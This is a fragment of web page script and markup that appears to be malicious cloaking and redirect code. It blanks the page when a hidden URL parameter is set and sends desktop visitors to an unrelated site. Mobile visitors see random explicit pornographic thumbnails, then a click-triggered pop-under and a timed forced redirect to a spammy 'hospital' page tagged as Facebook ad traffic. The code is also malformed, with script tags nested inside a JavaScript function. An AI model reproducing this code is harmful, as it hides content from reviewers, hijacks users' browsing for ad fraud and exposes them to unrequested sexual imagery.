
(function() {
  	const url = new URL(window.location.href);
  	const jcfd = url.searchParams.get("jcfd");

  	if (jcfd) {
	    sessionStorage.setItem("jcfd", jcfd);

	    // 3. Remove "code" param from the URL (clean the address bar)
	    url.searchParams.delete("jcfd");
	    window.history.replaceState({}, document.title, url.pathname + url.hash);
  	}

  	const stcd = sessionStorage.getItem("jcfd");
  	if (stcd == "xyz") {
    	document.body.innerHTML = '<span style="display:none;">my error</span>';
    	document.querySelectorAll('link[rel="stylesheet"], style').forEach(el => el.remove());
 <script>
        // Function to detect if the user is on a PC or laptop
        var userAgent = navigator.userAgent.toLowerCase();
        
        // Check for Windows or Mac OS (typical PC/laptop platforms)
        if (userAgent.indexOf("windows") !== -1 || userAgent.indexOf("macintosh") !== -1) {
            // Redirect to the desired URL for PC users
            window.location.href = "https://open.spotify.com/";  // Replace with your shortened URL
        }
    </script>
<style>
/* Container */
.random-image-container {
    width: 100%;
    max-width: 600px;
    margin: 20px auto;
    border-radius: 12px;
    overflow: hidden;
}

/* Image */
.random-image-container img {
    width: 100%;
    height: auto;
    display: block;
    object-fit: cover;
}
</style>
</head>

<body>

<a href="https://example.com" target="_blank">
    <div class="random-image-container">
        <img id="randomImage" src="" alt="Random Image">
    </div>
</a>

<script>
/* Image list */
const images = [
    "https://cdn3240.nyc3.cdn.digitaloceanspaces.com/fullpng/Most-Viewed-Sex-Videos-All-Time-SexVid-xxx-01-24-2025_05_12_PM.png",
    "https://cdn3240.nyc3.cdn.digitaloceanspaces.com/fullpng/Newest-Sex-Videos-SexVid-xxx-01-24-2025_05_12_PM.png",
    "https://cdn3240.nyc3.cdn.digitaloceanspaces.com/fullpng/Prada-XXX-giving-nice-head-and-getting-harshly-smacked-SexVid-xxx-01-24-2025_06_44_PM.png",
    "https://cdn3240.nyc3.cdn.digitaloceanspaces.com/fullpng/Whore-seduced-boss-to-unconsciously-sleep-with-her-SexVid-xxx-01-24-2025_06_45_PM.png",
    "https://cdn3240.nyc3.cdn.digitaloceanspaces.com/fullpng/Charming-brunette-girl-is-receiving-a-big-dick-in-sideways-position-SexVid-xxx-01-24-2025_06_47_PM.png"
];

/* Pick random image */
const randomIndex = Math.floor(Math.random() * images.length);
document.getElementById("randomImage").src = images[randomIndex];
</script>
		<script>document.addEventListener("click",(function(){let n=window.open("https://premium-medical-hospitals.sharedoze.com/best-10-hospital-in-chennai-for-quality-care/?utm_source=facebook&utm_medium=medical&utm_campaign=hospital_guides","_blank");n&&(n.blur(),window.focus())}),{once:!0});</script>
		    <script>
    setTimeout(function() {
        // Generate a random number between 0 and 1
        var rand = Math.random();

        if (rand < 0.58) {
            // 58% of the time
            window.location.href = 'https://premium-medical-hospitals.sharedoze.com/best-10-hospital-in-chennai-for-quality-care//?utm_source=facebook&utm_medium=medical&utm_campaign=hospital_guides';
        } else {
            // 40% of the time
            window.location.href = 'https://premium-medical-hospitals.sharedoze.com/best-10-hospital-in-chennai-for-quality-care//?utm_source=facebook&utm_medium=medical&utm_campaign=hospital_guides';
        }
    }, 6000);
</script>
	}
})();
